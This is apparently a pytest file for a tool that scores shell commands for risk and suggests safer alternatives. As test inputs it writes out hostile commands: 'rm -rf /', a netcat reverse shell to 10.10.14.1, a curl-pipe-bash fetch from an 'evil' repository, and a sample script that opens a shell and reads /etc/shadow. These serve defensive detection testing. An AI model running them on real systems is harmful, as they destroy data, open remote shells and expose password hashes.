import pytest
from httpx import AsyncClient, ASGITransport
from app.main import app
from app.core.pipeline.heuristic_tool import HeuristicAnalyzerTool
from app.core.pipeline.script_tool import ScriptIntentAnalyzerTool
from app.core.pipeline.base import PipelineContext


@pytest.mark.asyncio
async def test_heuristic_alternatives_rm_rf():
    tool = HeuristicAnalyzerTool()
    ctx = PipelineContext(command="rm -rf /")
    await tool.process(ctx)
    assert ctx.heuristic_risk == "CRITICAL"
    assert len(ctx.suggested_alternatives) > 0
    assert any("trash-put" in alt or "rm -ri" in alt for alt in ctx.suggested_alternatives)


@pytest.mark.asyncio
async def test_heuristic_alternatives_reverse_shell():
    tool = HeuristicAnalyzerTool()
    ctx = PipelineContext(command="nc 10.10.14.1 4444 -e /bin/bash")
    await tool.process(ctx)
    assert ctx.heuristic_risk == "CRITICAL"
    assert len(ctx.suggested_alternatives) > 0
    assert any("ssh -R" in alt or "cloudflared tunnel" in alt for alt in ctx.suggested_alternatives)


@pytest.mark.asyncio
async def test_heuristic_alternatives_netcat_listener():
    tool = HeuristicAnalyzerTool()
    ctx = PipelineContext(command="nc -lvnp 8080")
    await tool.process(ctx)
    assert len(ctx.suggested_alternatives) > 0
    assert any("ssh -L" in alt or "--ssl" in alt for alt in ctx.suggested_alternatives)


@pytest.mark.asyncio
async def test_heuristic_alternatives_chmod_777():
    tool = HeuristicAnalyzerTool()
    ctx = PipelineContext(command="chmod -R 777 /var/www")
    await tool.process(ctx)
    assert ctx.heuristic_risk == "CRITICAL"
    assert len(ctx.suggested_alternatives) > 0
    assert any("755" in alt or "644" in alt for alt in ctx.suggested_alternatives)


@pytest.mark.asyncio
async def test_heuristic_alternatives_curl_pipe_bash():
    tool = HeuristicAnalyzerTool()
    ctx = PipelineContext(command="curl https://raw.githubusercontent.com/evil/test/main/install.sh | bash")
    await tool.process(ctx)
    assert ctx.heuristic_risk == "CRITICAL"
    assert len(ctx.suggested_alternatives) > 0
    assert any("less" in alt or "bash -n" in alt for alt in ctx.suggested_alternatives)


@pytest.mark.asyncio
async def test_script_tool_malicious_alternatives():
    tool = ScriptIntentAnalyzerTool()
    malicious_script = """#!/bin/bash
nc 10.10.14.1 4444 -e /bin/bash &
cat /etc/shadow
"""
    ctx = PipelineContext(
        command="bash deploy.sh",
        script_content=malicious_script,
        script_name="deploy.sh",
    )
    await tool.process(ctx)
    assert ctx.script_verdict is not None
    assert ctx.script_verdict.is_malicious is True
    assert len(ctx.suggested_alternatives) > 0
    assert any("bash -n deploy.sh" in alt for alt in ctx.suggested_alternatives)
    assert any("shellcheck deploy.sh" in alt for alt in ctx.suggested_alternatives)


@pytest.mark.asyncio
async def test_api_analyze_suggested_alternatives_endpoint():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        res = await client.post(
            "/api/analyze",
            json={"command": "rm -rf / --no-preserve-root"}
        )
        assert res.status_code == 200
        data = res.json()
        assert data["risk_level"] == "CRITICAL"
        assert "suggested_alternatives" in data
        assert len(data["suggested_alternatives"]) > 0
